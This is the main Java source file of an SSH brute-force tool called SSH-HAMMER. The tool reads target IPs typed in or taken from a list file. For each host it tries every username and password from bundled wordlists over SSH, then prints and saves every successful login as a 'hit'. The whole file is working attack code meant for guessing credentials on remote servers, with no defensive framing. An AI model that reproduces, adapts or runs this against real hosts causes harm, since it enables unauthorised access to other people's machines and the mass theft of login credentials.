package xyz.becvar.sshhammer;

import xyz.becvar.sshhammer.utils.*;
import xyz.becvar.sshhammer.utils.console.ConsoleColors;
import xyz.becvar.sshhammer.utils.console.Logger;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.Scanner;

public class Main {

    // default variables
    public static String APP_NAME = "SSH-HAMMER";

    // init objects
    public static Scanner scanner = new Scanner(System.in);

    // init basic variables
    public static int portToScan = 22;

    // MAIN APP FUCTION
    public static void main(String[] args) {

        // create default usernames list
        if (!FileUtils.ifFileExist("usernames.txt")) {
            ResourcesUtils.copyResource(Main.class.getClassLoader().getResourceAsStream("usernames.txt"), "usernames.txt");
        }

        // create default passwords list
        if (!FileUtils.ifFileExist("passwords.txt")) {
            ResourcesUtils.copyResource(Main.class.getClassLoader().getResourceAsStream("passwords.txt"), "passwords.txt");
        }

        // question on port
        System.out.print(ConsoleColors.CODES.ANSI_CYAN + "Type port do you want to scan: ");
        String port = scanner.nextLine();

        // check if port empty
        if (port.isEmpty()) {
            Logger.INSTANCE.logError("error please type valid port number");
            SystemUtils.appShutdown(0);
        } else {

            // check if port is number
            if (StringUtils.isNumeric(port)) {

                // convert port to int value
                portToScan = Integer.parseInt(port);
            } else {

                // exit if port is not number
                Logger.INSTANCE.logError("error port number must be a number");
                SystemUtils.appShutdown(0);
            }
        }

        // question on iplist
        System.out.print(ConsoleColors.CODES.ANSI_CYAN + "Do you want to use the ip list? [Y/N]: ");
        String ipList = scanner.nextLine();

        // check if iplist used
        if (!ipList.equalsIgnoreCase("n")) {

            // check if iplist found
            if (!FileUtils.ifFileExist("ip-list.txt")) {
                Logger.INSTANCE.logError("error: ip list not found, please create ip-list.txt with ips to scan");
            } else {

                // check if ip list exist
                if (FileUtils.ifFileExist("ip-list.txt")) {

                    try (BufferedReader br = new BufferedReader(new FileReader("ip-list.txt"))) {
                        String ipToScan;

                        // for all ips in iplist.txt
                        while ((ipToScan = br.readLine()) != null) {
                            connectSSH(ipToScan, portToScan);
                        }
                    } catch (IOException e) {
                        Logger.INSTANCE.logError(e.getMessage());
                    }
                }
            }

        } else {

            // question on iplist
            System.out.print(ConsoleColors.CODES.ANSI_CYAN + "Please enter IPv4 address: ");
            String ipAdress = scanner.nextLine();

            // check if ip configured
            if (ipAdress.isEmpty()) {

                // argument empty error
                Logger.INSTANCE.logError("error: input ip is empty");
            } else {

                // check if ip is valid
                if (!NetworkUtils.checkIPv4(ipAdress)) {
                    Logger.INSTANCE.logError("'"+ ipAdress + "'" + " is not valid IPv4");

                } else {

                    // main connect function call
                    connectSSH(ipAdress, portToScan);
                }
            }
        }

        // check if hits found
        if (FileUtils.ifFileExist("hits.txt")) {
            Logger.INSTANCE.log("brutefoce is finished, possible hits can be found in the hists.txt file");
        } else {
            Logger.INSTANCE.log("brutefoce is finished");
        }

        // exit app
        SystemUtils.appShutdown(0);
    }

    // main SSH connect function
    public static void connectSSH(String host, int port) {

        // check if ipv4 reachable ssh
        if (!NetworkUtils.isReachable(host, port, 10000)) {
            Logger.INSTANCE.logError("'"+ host + "'" + " SSH is not reachable");
        } else {

            // check if usernames list exist
            if (FileUtils.ifFileExist("usernames.txt")) {

                try (BufferedReader br = new BufferedReader(new FileReader("usernames.txt"))) {
                    String user;

                    // for all users in usernames.txt
                    while ((user = br.readLine()) != null) {

                        // check if password list exist
                        if (FileUtils.ifFileExist("passwords.txt")) {

                            try (BufferedReader br1 = new BufferedReader(new FileReader("passwords.txt"))) {
                                String password;

                                // for all passwwords in passwords.txt
                                while ((password = br1.readLine()) != null) {

                                    // main connect function call
                                    if (NetworkUtils.sshConnectionValid(user, port, host, password)) {
                                        // print connection hit sucess
                                        Logger.INSTANCE.log(ConsoleColors.CODES.ANSI_GREEN + "HIT: " + host + ":" + port + " with " + user + ":" + password + " connection sucess");

                                        FileUtils.saveMessageLog("host: " + host + ":" + port + " connect with credentials: " + user + ":" + password, "hits.txt");
                                    } else {

                                        // print connection error
                                        Logger.INSTANCE.log(ConsoleColors.CODES.ANSI_YELLOW + host + ":" + port + " -> " + user + ":" + password + " not connected");
                                    }
                                }
                            } catch (IOException e) {
                                Logger.INSTANCE.logError(e.getMessage());
                            }

                        } else {
                            // log file not exist error
                            Logger.INSTANCE.logError("error passwords.txt not found, please check your file or try reinstall this app");
                        }
                    }
                } catch (IOException e) {
                    Logger.INSTANCE.logError(e.getMessage());
                }

            } else {
                // log file not exist error
                Logger.INSTANCE.logError("error usernames.txt not found, please check your file or try reinstall this app");
            }
        }
    }
}
